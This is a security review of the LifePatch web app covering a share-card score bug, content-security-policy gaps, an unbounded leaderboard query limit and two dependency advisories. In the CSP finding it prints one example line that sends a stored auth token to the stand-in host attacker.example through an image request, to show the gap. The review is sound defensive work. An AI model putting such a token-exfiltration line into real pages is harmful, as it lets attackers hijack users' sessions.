# LifePatch — Codebase Review, 2026-09-16

Full-repo pass for security vulnerabilities, functional bugs and performance
issues. Scope: app routes, Edge Functions, SQL schema + migrations, client
libraries, the multiplayer protocol, and the dependency tree.

## Verdict up front

**No critical security vulnerability was found, and this section is not a
formality.** The usual holes are closed, and closed deliberately — the write
surface is grant-restricted per column, RLS is backed by CHECK constraints
rather than trusting them, the username filter has exactly one implementation
that both the browser and the Edge Function import, and every inbound
multiplayer byte is rebuilt field-by-field rather than passed through. Several
findings below are of the "the comment claims more than the code delivers"
kind rather than the "this is exploitable" kind, and they are labelled as such.

Checks run clean: `typecheck` (0 errors), `lint` (0 errors), and the project's
own QA gates — `qa:engine` 34/34, `qa:rls` 16 probes closed, `qa:username`
1728 names, `qa:rename` 16/16, `qa:challenge` 10/10, `qa:cloud` 16/16,
`qa:metrics` 19/19. No hardcoded secrets: every match for key-shaped patterns
is a SQL role name or the `.env.local.example` comment warning against pasting
a secret key.

Findings are ordered by priority. There is no Critical bucket because nothing
earned one.

---

## 1. Functional Bug — the OG share card can print `—` where the score belongs

**File:** `app/api/og/[id]/route.tsx:207` (with `:69`)
**Severity:** Moderate — public-facing, affects the most widely-seen surface in
the product.

`fetchRow` validates the score and then throws the validated value away:

```ts
if (!row || finiteColumn(row.score) === null) return null;   // line 69
return row;                                                   // raw row, uncoerced
```

`finiteColumn` exists precisely because this route bypasses `fromRow` — and
`fromRow` is the only place that does `score: Number(row.score)`
(`lib/cloud/results.ts:67`). `lib/metrics.ts:84-93` states the reason outright:
`score` is a `numeric` column "which PostgREST is entitled to serialise either
way". So the string case is admitted by the code's own reasoning, but the
coercion never happens on this path.

When the column arrives as a string, the row **passes** validation and then
renders wrong, because `Number.isFinite` does not coerce:

```
finiteColumn("128450.75")  -> 128450.75      (row accepted)
currency("128450.75")      -> "—"            (what the card prints)
"128450.75" >= 0           -> true           (relational ops DO coerce)
```

The result is the worst version of the failure: the 84px score reads `—` while
the colour beside it is confidently gain-green, on a 1200×630 image cached at
`s-maxage=86400` and fanned out to every chat client that unfurls the link.
`app/r/[id]/page.tsx` is unaffected — it goes through `getResult` → `fromRow`
— so the page and the card disagree about the same row, which is the exact
divergence `lib/metrics.ts:103-109` was written to make unrepresentable.

**Fix** — coerce once, where the value is already being validated:

```ts
// in fetchRow, replacing the line-69 check
const score = finiteColumn(row.score);
if (!row || score === null) return null;
return { ...row, score };   // the card renders the number it validated
```

---

## 2. Security (defence-in-depth) — the CSP does not deliver its stated goal

**File:** `next.config.ts:88-115` (rationale at `:1-45`)
**Severity:** Low exploitability today, but the header is load-bearing in the
file's own argument, and the gap is free to close.

The policy ships six directives: `frame-ancestors`, `frame-src`, `form-action`,
`object-src`, `base-uri`, `connect-src`. There is **no `default-src`**, and
every directive that would otherwise fall back to it is therefore unrestricted:
`img-src`, `style-src`, `font-src`, `media-src`, `manifest-src`.

The file argues — persuasively — that omitting `script-src` is a considered
trade, because a nonce forces every route dynamic and costs `/r/{id}` its ISR.
That reasoning is sound and I am not asking for `script-src`. The problem is the
sentence justifying the half that *was* kept:

> `connect-src` … does not stop an injected script from running, but it does
> stop one from phoning home, and exfiltration is the part of an injection that
> actually hurts a player.

`connect-src` governs `fetch`, XHR, WebSocket and `sendBeacon`. It does not
govern image requests. An injected script exfiltrates in one line, unimpeded:

```js
new Image().src = 'https://attacker.example/?d=' + localStorage.getItem('sb-...-auth-token');
```

Same for `<link rel=prefetch>`, CSS `url()` and webfont loads. So the one
directive the file chose to pay for does not close the channel it names. The
premises for deferring `script-src` still hold (no `dangerouslySetInnerHTML`
anywhere in the tree, no user-supplied markup, username charset-locked in three
places) — but that is an argument about the *first* line of defence, and this
is the second one failing silently.

**Fix** — add the directives that cost nothing, and do **not** add `default-src`
(that would pull `script-src` in with it and re-open the ISR problem the file
correctly refuses). All assets are same-origin: fonts are the two bundled
`.ttf`s, video is `public/board3d/*`, and the share card and QR use `data:` and
`blob:` (`components/share/ShareCard.tsx:47,69`, `drawShareCard.ts:86`).

```ts
"img-src 'self' data: blob:",   // toDataURL previews + QR + createObjectURL
"media-src 'self'",             // public/board3d/board-orbit.{mp4,webm}
"font-src 'self'",              // bundled Anton + IBMPlexMono
"style-src 'self' 'unsafe-inline'",  // 'unsafe-inline' is required: Next injects
                                     // inline styles and the tree uses style={{}}
```

Worth also correcting the comment, so the next reader does not inherit the
belief that exfiltration is already covered.

---

## 3. Performance / cost — `top_results` takes an unbounded `p_limit` from `anon`

**File:** `supabase/migrations/2026-09-02_10_top_results.sql:45-95`
**Severity:** Low-moderate. Not a data-exposure issue — `results` is
`public read` by design — but an unauthenticated cost amplifier.

The function is granted to `anon, authenticated` (`:94`) and `p_limit` has a
default of 25 and no ceiling. The client never sends a large one
(`lib/cloud/results.ts:248` caps at `DEFAULT_LIMIT`), but the RPC is reachable
directly with the publishable key, which every browser holds.

`p_limit` only bounds the output rows, so the ceiling is one row per player —
the inner `distinct on (r.user_id)` scans the mode's rows regardless. The
exposure is therefore bandwidth and query cost rather than new data: one
unauthenticated request returns the entire player base's best rows, and repeats
cheaply.

This is consistent with the ceilings the schema already puts on everything else
that a client can name (`results_score_sane`, `results_metrics_small`,
`saves_state_small`, `streaks_sane`) — `p_limit` is the one client-supplied
number that did not get one.

**Fix** — clamp in the function, where it cannot be skipped:

```sql
   order by b.score desc, b.id asc
   limit least(greatest(coalesce(p_limit, 25), 1), 100);
```

`greatest(…, 1)` also removes the negative case, which currently raises
`LIMIT must not be negative` rather than returning a board.

---

## 4. Code Quality — two dependency advisories, both currently unreachable

**File:** `package.json` / `package-lock.json`
**Severity:** Low. Reported for completeness and tracked honestly — neither is
exploitable in this app as it stands.

`npm audit`: 2 moderate, 0 high, 0 critical.

| Package | Advisory | Path | Reachable here? |
|---|---|---|---|
| `fflate@0.6.10` | [GHSA-px8p-9vwx-vf98](https://github.com/advisories/GHSA-px8p-9vwx-vf98) — `unzipSync` infinite loop on malformed ZIP64 | `@react-three/rapier` → `three-stdlib` | **No.** Nothing in the tree calls a three.js archive loader; `public/board3d` is `.mp4`/`.webm`/`.jpg`. No attacker-supplied archive is ever parsed. |
| `qs@6.15.3` | [GHSA-x5fp-wj9c-mxmx](https://github.com/advisories/GHSA-x5fp-wj9c-mxmx), [GHSA-4mjr-xmp4-gh2g](https://github.com/advisories/GHSA-4mjr-xmp4-gh2g) | `shadcn` → `@modelcontextprotocol/sdk` → `express` | **No.** `shadcn` is a `devDependency` CLI; never bundled or served. |

**Fix** — `npm audit fix` resolves both (`fixAvailable: true` for each) and
clears the report without touching runtime behaviour. Low urgency; worth doing
so a future *reachable* advisory is not buried under two standing ones.

---

## Areas reviewed and found sound

Recording these so the next pass need not re-derive them.

- **SQL write surface.** Table-level `INSERT`/`UPDATE` revoked from
  `authenticated`/`anon` and re-granted per column (`schema.sql:122-143`,
  `:258-262`) — the only correct order, since a column-level `REVOKE` cannot
  carve out of a table grant. `id` and `created_at` are not grantable, so a
  forged `/r/{id}` slug or a year-3000 weekly-board row is refused.
- **`profiles_public`.** `revoke all` before `grant select` (`:161-162`), which
  is what stops an auto-updatable owner-run view becoming an RLS bypass.
  `friend_code` is correctly absent from the projection.
- **Friend edges.** The `status = 'pending' or has_incoming_request(friend_id)`
  check (`:411-421`) closes the forged-`accepted` edge that `listIncoming`
  would never have surfaced.
- **Rename limiter.** Atomic via `spend_rename_attempt` (migration 09), spent
  *before* the uniqueness check so the 409/400 oracle is bounded, and fails
  open — the right direction for this control.
- **Multiplayer protocol.** `lib/mp/protocol.ts` rebuilds every inbound object,
  clamps every number, version-gates the channel topic, caps the roster before
  parsing, and cross-validates `year >= startYear`. `hooks/useMatch.tsx`
  fences status and snapshot messages by roster membership *and* session
  owner, failing closed once presence has seated a session.
- **Untrusted JSON.** `lib/metrics.ts` reads client-written `jsonb` with
  `typeof` rather than `Number()`, and validates series whole-then-caps so a
  hole cannot silently re-date every later year.
- **CSPRNG.** `randomIndex` (`_shared/generate.ts:39`) uses rejection sampling
  correctly — the accepted range is an exact multiple of `bound`, so there is
  no modulo bias — and covers the friend code, username and avatar seed from
  one stream.
- **Injection.** No `dangerouslySetInnerHTML`, `eval`, `new Function` or
  `innerHTML` anywhere. The `/api/og` REST call interpolates `id` only after a
  strict UUID match (`:28`, `:47`); every other query goes through
  supabase-js parameter binding.
- **Leaderboard fetching.** `getProfiles(top.map(...))` is one batched call,
  not N+1 (`components/social/Leaderboard.tsx:275`).
